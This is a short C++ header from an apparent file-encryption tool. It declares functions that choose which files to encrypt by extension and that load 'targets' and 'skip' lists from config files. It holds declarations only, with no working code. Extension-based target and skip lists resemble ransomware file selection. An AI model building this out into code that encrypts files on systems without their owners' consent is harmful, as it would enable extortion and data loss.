// targets.h — File extension whitelist / blacklist
#pragma once

#include <string>
#include <unordered_set>

namespace encryptor {

// Returns true if the file at path should be encrypted.
bool should_encrypt(const std::wstring& path, const std::wstring& ext);

// Load config from file. Returns false if file missing.
bool load_targets(const std::wstring& config_path);
bool load_skip(const std::wstring& config_path);

} // namespace encryptor
